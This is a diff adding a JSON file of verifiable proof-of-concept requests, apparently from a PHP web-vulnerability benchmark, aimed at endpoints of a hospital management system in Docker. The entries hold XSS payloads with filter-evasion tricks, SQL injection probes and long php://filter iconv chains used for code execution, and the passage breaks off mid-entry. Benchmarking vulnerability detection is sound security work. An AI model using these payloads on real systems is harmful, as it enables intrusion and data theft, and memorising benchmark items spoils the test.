@@ -1,0 +1,1103 @@
+[
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/doctor/forgot-password.php",
+    "post_data": {
+      "contactno": [
+        "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"
+      ],
+      "email": [
+        "1%3Cscr%3C%21--%20--%3Eipt%3Ealert%28987890%29%3C/scr%3C%21--%20--%3Eipt%3E"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681a10afab2c9",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_002eed",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/admin/contact.php",
+    "post_data": {
+      "email": [
+        "test@test.com"
+      ],
+      "mobnum": [
+        "112334455"
+      ],
+      "pagedes": [
+        "\""
+      ],
+      "pagetitle": [
+        "1998-10-11"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.682c75450cbec",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_013d1f",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/user-login.php",
+    "post_data": {
+      "password": [
+        "5543!%arachni_secret"
+      ],
+      "submit": [
+        "1"
+      ],
+      "username": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67d824e428c83",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_06234f",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "GET",
+    "path": "/hms/admin/view-patient.php",
+    "post_data": {},
+    "query_params": {
+      "viewid": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ]
+    },
+    "request_id": "requests.67d824e3f38bf",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_070657",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/user-login.php",
+    "post_data": {
+      "password": [
+        "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"
+      ],
+      "submit": [
+        ""
+      ],
+      "username": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681a10afbd0ff",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_076667",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/admin/add-doctor.php",
+    "post_data": {
+      "Doctorspecialization": [
+        "ENT"
+      ],
+      "cfpass": [
+        "xuefeng20011024"
+      ],
+      "clinicaddress": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "doccontact": [
+        "1998-10-11"
+      ],
+      "docemail": [
+        "test@test.com"
+      ],
+      "docfees": [
+        "1998-10-11"
+      ],
+      "docname": [
+        "1998-10-11"
+      ],
+      "npass": [
+        "xuefeng20011024"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.68286fbd64190",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_08952a",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/user-login.php",
+    "post_data": {
+      "password": [
+        "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"
+      ],
+      "submit": [
+        ""
+      ],
+      "username": [
+        "\""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681a10afbd0ff",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_165b1a",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/forgot-password.php",
+    "post_data": {
+      "email": [
+        "wapiti2021@mailinator.com"
+      ],
+      "fullname": [
+        "\""
+      ],
+      "submit": [
+        "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681a10afb5d75",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_277be5",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/registration.php",
+    "post_data": {
+      "address": [
+        "1998-10-11"
+      ],
+      "city": [
+        "1998-10-11"
+      ],
+      "email": [
+        "%22%3E%3Ca%20href%3Djavascrip%26%23116%3B%3Aalert%28987890%29%3B%3E1%3C/a%3E"
+      ],
+      "full_name": [
+        "x'efeng20011024"
+      ],
+      "gender": [
+        "male"
+      ],
+      "password": [
+        "xuefeng20011024"
+      ],
+      "password_again": [
+        "xuefeng20011024"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.68286fbd779aa",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_286c1d",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/admin/doctor-specilization.php",
+    "post_data": {
+      "doctorspecilization": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681b69793393c",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_332ac1",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/registration.php",
+    "post_data": {
+      "address": [
+        "1998-10-11"
+      ],
+      "city": [
+        "1998-10-11"
+      ],
+      "email": [
+        "test@test.com"
+      ],
+      "full_name": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "gender": [
+        "male"
+      ],
+      "password": [
+        "xuefeng20011024"
+      ],
+      "password_again": [
+        "xuefeng20011024"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.68286fbd74f22",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_484942",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/admin/betweendates-detailsreports.php",
+    "post_data": {
+      "fromdate": [
+        "1%3Cscript%3Ealert%28987890%29%3C/script%3E"
+      ],
+      "submit": [
+        ""
+      ],
+      "todate": [
+        "11024-02-01"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67d824e3eb493",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_4c34cb",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/admin/query-details.php",
+    "post_data": {
+      "adminremark": [
+        "'"
+      ],
+      "update": [
+        ""
+      ]
+    },
+    "query_params": {
+      "id": [
+        "1?id=1"
+      ]
+    },
+    "request_id": "requests.67d824e420e52",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/hospital-management-system-in-php",
+    "vuln_id": "vuln_function_55e88d",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "hospmgmt",
+    "application_name": "Hospital Management System",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-hospmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/hms/admin/check_availability.php",
+    "post_data": {
+      "emailid": [
+        "1%3Cscr%3C%21--%20--%3Eipt%3Ealert%28987890%29%3C/scr%3C%21--%20--%3Eipt%3E"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.682c7544e9cc8",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
